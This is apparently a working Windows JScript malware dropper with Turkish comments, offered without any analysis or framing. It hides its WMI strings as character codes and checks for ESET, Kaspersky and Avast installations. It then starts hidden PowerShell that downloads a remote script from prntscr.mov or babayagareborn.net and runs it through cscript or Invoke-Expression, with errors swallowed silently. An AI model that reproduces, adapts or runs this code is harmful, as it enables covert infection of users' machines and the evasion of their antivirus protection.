// Ortak fonksiyon: string oluşturma
function _k(a) {
    var s = "";
    for (var i = 0; i < a.length; i++) s += String.fromCharCode(a[i]);
    return s;
}

// Gizli stringler
var _m = _k([119,105,110,109,103,109,116,115,58,92,92,46,92,114,111,111,116,92,99,105,109,118,50]); 
var _p = _k([87,105,110,51,50,95,80,114,111,99,101,115,115]); 
var _s = _k([87,105,110,51,50,95,80,114,111,99,101,115,115,83,116,97,114,116,117,112]); // Win32_ProcessStartup

// Yollar ve URL'ler
var _esetPath = "C:\\\\Program Files\\\\ESET\\\\ESET Security\\\\ecmds.exe";
var _path1 = "C:\\Pro" + "gram Fi" + "les\\ES" + "ET\\ES" + "ET Secu" + "rity\\ecm" + "ds.exe"; 
var _path2 = "C:\\Pro" + "gram Fil" + "es (x86)\\Kasp" + "ersky La" + "b\\Kaspe" + "rsky 21.2" + "4\\avp" + "ui.exe"; 
var _path3 = "C:\\Pro" + "gram Files\\Avas" + "t Software\\Avas" + "t\\Avast" + "UI.exe"; 

var _u1 = "htt" + "ps://prnt" + "scr.mov/x.js";
var _u2 = "htt" + "ps://babayagar" + "eborn.net/blackhole/nod32/iexkisalt.txt";

function _combined_bypass() {
    try {
        var _svc = GetObject(_m);

        // --- 1. KODDAKİ GİZLİ ÇALIŞMA AYARI (KRİTİK) ---
        var _cfg = _svc.Get(_s).SpawnInstance_();
        _cfg.ShowWindow = 0; // Pencereyi tamamen gizler

        // WMI ile ESET kontrolü
        var _query = "Select * from CIM_DataFile where Name = '" + _esetPath + "'";
        var _files = _svc.ExecQuery(_query);

        var _bin = "pow" + "ersh" + "ell.e" + "xe";
        var _args = " -NoP -W 1 -c "; // Gizli ve Kalıcı Argümanlar
        var _cmd = "";

        if (_files.Count > 0) {
            // ESET VARSA
            var _p1 = "$c=iwr '" + _u1 + "' -useb;$p=$env:temp+'\\t.js';$c.Content|Out-File $p -Enc ASCII;cscript //nologo $p";
            _cmd = _bin + _args + "\"" + _p1 + "\"";
        } else {
            // ESET YOKSA (Kaspersky/Avast Kontrolü)
            var _psLogic = 
                "$e='" + _path1 + "';" +
                "$k='" + _path2 + "';" +
                "$a='" + _path3 + "';" +
                "if (Test-Path $k) {" +
                    "$u='" + _u1 + "'; $c=iwr $u -useb; $p=$env:temp+'\\t.js'; $c.Content|Out-File $p -Enc ASCII; cscript //nologo $p" +
                "} elseif (Test-Path $a) {" +
                    "$u='" + _u1 + "'; $c=iwr $u -useb; $p=$env:temp+'\\t.js'; $c.Content|Out-File $p -Enc ASCII; cscript //nologo $p" +
                "} else {" +
                    "$u='" + _u2 + "'; IEX(iwr $u -useb).Content" +
                "}";
            _cmd = _bin + _args + "\"" + _psLogic + "\"";
        }

        // Win32_Process.Create ile 'null' ve '_cfg' parametrelerini kullanarak gizli infaz
        var _cls = _svc.Get(_p);
        _cls.Create(_cmd, null, _cfg);

    } catch (e) {
        // Sessiz hata yönetimi
    }
}

// Çalıştır
_combined_bypass();

// Temizlik
_combined_bypass = null; _m = null; _p = null; 
